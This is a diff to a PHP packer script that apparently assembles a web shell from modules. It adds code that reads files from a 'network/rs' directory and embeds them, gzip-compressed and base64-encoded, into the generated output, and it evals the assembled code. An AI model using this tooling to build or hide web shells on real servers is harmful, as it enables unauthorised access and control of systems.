@@ -17,6 +17,7 @@ $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
+$GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['cipher_key'] = generateRandomString(32);
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
@@ -74,8 +75,8 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."localmain.php");
-		$content = trim($module_init)."?>".$base_code.$module_code.$layout;
-		eval($content);
+		$rs_content = trim($module_init)."?>".$base_code.$module_code.$layout;
+		eval($rs_content);
 		die();
 	}
 	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
@@ -382,8 +383,27 @@ else{
 		foreach($modules as $module){
 			$module = trim($module);
 			$filename = $GLOBALS['packer']['module_dir'].$module;
-			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
-			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
+			if(is_file($filename.".php")) {
+			    $php_data = packer_read_file($filename.".php");
+
+                if($module == 'network') {
+                    $files = scandir($GLOBALS['packer']['network_rs_dir']);
+                    $rs_content = "";
+                    foreach($files as $rs) {
+                        if(!in_array($rs, array(".",".."))) {
+                            $rs_data = packer_read_file($GLOBALS['packer']['network_rs_dir'] . $rs);
+                            $info = pathinfo($rs);
+                            $rs_content .= "\$GLOBALS['resources']['rs_" . basename($rs, '.'.$info['extension']) . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
+                        }
+                    }
+                    $php_data = str_replace("//<__RS__>", $rs_content, $php_data);
+                }
+
+			    $module_code .= $php_data;
+            }
+			if(is_file($filename.".js")) {
+			    $js_code .= "\n".packer_read_file($filename.".js")."\n";
+            }
 		}
 
 		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
